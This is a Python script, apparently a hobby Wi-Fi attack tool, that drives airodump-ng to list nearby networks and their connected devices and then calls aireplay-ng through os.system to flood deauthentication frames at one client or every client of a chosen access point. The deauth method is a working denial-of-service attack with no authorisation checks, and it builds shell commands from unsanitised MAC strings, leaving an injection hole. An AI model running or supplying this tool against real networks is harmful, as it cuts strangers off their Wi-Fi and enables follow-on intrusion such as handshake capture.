import subprocess
import time
import signal
import os
import csv

class SudoWifi:
    """ scan all networks avalable it's scan for 30 seconds you can chang duration to scan for costom sec. """
    def scan_wifi(self,interface):
        duration=40 # here is scan duration
        bssid=None
        channel=None
        output_file = "scan_output-01.csv"
        
        # Construct the command
        command = [
            "sudo", "airodump-ng", interface,
            "--write-interval", "1", "--output-format", "csv", "--write", "scan_output"
        ]
        # Start the airodump-ng process
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Started airodump-ng scan on {interface} for {duration} seconds...")

        # Wait for the specified duration
        time.sleep(duration)

        # Stop the process
        process.send_signal(signal.SIGINT)
        process.wait()
        print("Scan completed.")

        # Parse the output CSV
        networks = []
        try:
            with open(output_file, "r") as file:
                lines = file.readlines()

            # Parse networks from the CSV file
            for line in lines[2:]:  # Skip header rows
                fields = line.split(',')
                if len(fields) >= 14 and fields[0].strip():  # Check if it's a valid BSSID line
                    network_info = {
                        "BSSID": fields[0].strip(),
                        "CH" : fields[3].strip(),
                        "ESSID": fields[13].strip()
                    }
                    networks.append(network_info)

        except FileNotFoundError:
            print("Output file not found. Ensure airodump-ng is producing output.")
        # Clean up the output files generated by airodump-ng
        if os.path.exists(output_file):
            os.remove(output_file)
        if os.path.exists("scan_output-01.kismet.csv"):
            os.remove("scan_output-01.kismet.csv")

        return networks


    """ scan bssid/devices connected to spacify wifi network """
    def scan_with_bssid(self,interface, bssid, duration=60):
        output_file = "output_file-01.csv"
        
        # Construct the command
        command = [
            "sudo", "airodump-ng", interface,
            "--bssid", bssid,
            "--write-interval", "1", "--output-format", "csv", "--write", "output_file"
        ]

        # Start the airodump-ng process
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Started airodump-ng scan on {interface} for BSSID {bssid} for {duration} seconds...")

        # Wait for the specified duration
        time.sleep(duration)

        # Stop the process
        process.send_signal(signal.SIGINT)
        process.wait()
        print("Scan with BSSID completed.")

        # Parse the output CSV for connected devices
        devices = []
        try:
            with open(output_file, "r") as file:
                lines = file.readlines()

            # Locate and parse devices connected to the specified BSSID
            parsing_devices = False
            for line in lines:
                if "Station MAC" in line:
                    parsing_devices = True
                    continue
                if parsing_devices:
                    fields = line.split(',')
                    if len(fields) >= 6:
                        device_info = {
                            "Station MAC": fields[0].strip(),
                        }
                        devices.append(device_info)

        except FileNotFoundError:
            print("Output file not found. Ensure airodump-ng is producing output.")

        # Clean up the output files generated by airodump-ng
        if os.path.exists(output_file):
            os.remove(output_file)
        if os.path.exists("output_file-01.kismet.csv"):
            os.remove("output_file-01.kismet.csv")

        return devices
    def scan_live_networks(self, interface):
        """Starts airodump-ng, displays networks, and handles cleanup in one function."""
        full_network = []
        seen_networks = {}

        # Start airodump-ng in monitor mode and save to CSV
        airodump_process = subprocess.Popen(
            ['airodump-ng', interface, '--write', 'output', '--output-format', 'csv'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        try:
            while True:
                # Check if the CSV file exists before reading
                if not os.path.exists('output-01.csv'):
                    time.sleep(1)
                    continue

                with open('output-01.csv', 'r') as file:
                    reader = csv.reader(file)
                    for row in reader:
                        # Skip header rows and empty rows
                        if len(row) < 14 or row[0] == 'BSSID':
                            continue

                        # Extract Wi-Fi information
                        bssid = row[0]
                        channel = row[3]
                        signal_dab = row[8]
                        essid = row[13]

                        # Add unique networks to seen_networks
                        if bssid not in seen_networks:
                            seen_networks[bssid] = {
                                'Channel': channel,
                                'Signal': signal_dab,
                                'ESSID': essid
                            }
                            full_network.append({
                                "BSSID": bssid,
                                "CH": channel,
                                "ESSID": essid
                            })

                    # Clear screen and display networks
                    print("\033[H\033[J")  # Clears the terminal screen
                    print("Nearby Wi-Fi Networks:")
                    print("-" * 40)
                    for bssid, info in seen_networks.items():
                        print(f"\033[92mESSID: \033[94m{info['ESSID']} \033[92mChannel: \033[94m{info['Channel']} \033[92mSignal: \033[94m{info['Signal']} \033[92mBSSID: \033[94m{bssid}\n")
                        #print("-" * 40)
                    # Keep CTRL+C message at bottom
                    #print("\033[92mCTRL+C to stop scanning...\033[0m\n", end="\r", flush=True)

                time.sleep(2)  # Update every 2 seconds

        except KeyboardInterrupt:
            print("\nStopping Wi-Fi scan...")
            print(full_network)
            return full_network
        #finally:
            # Terminate airodump-ng process and clean up files
            airodump_process.send_signal(signal.SIGINT)
            airodump_process.wait()
            if os.path.exists('output-01.csv'):
                os.remove('output-01.csv')
            if os.path.exists('output-01.kismet.csv'):
                os.remove('output-01.kismet.csv')

    """ Deauth attack excuter """
    def deauth(self,interface,network_mac,device_mac=None,is_all=False):
        if is_all : 
            print(f"Deauth all devices from {network_mac} using aireplay ...")
            print("\033[92m(CTRL+C) to stop attack\033[0m")
            print("\033[94m")
            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} wlan0")
        else : 
            print(f"Deauth {device_mac} from {network_mac} using aireplay ...")
            print("\033[92m(CTRL_C) to stop attack\033[0m")
            print("\033[94m")
            os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} -c {device_mac} wlan0")

if __name__ == "__main__":
    # Usage
    wifi_interface = 'wlan0'  # Replace with your Wi-Fi interface in monitor mode
    scanner = SudoWifi()
    scanner.scan_live_networks(wifi_interface)

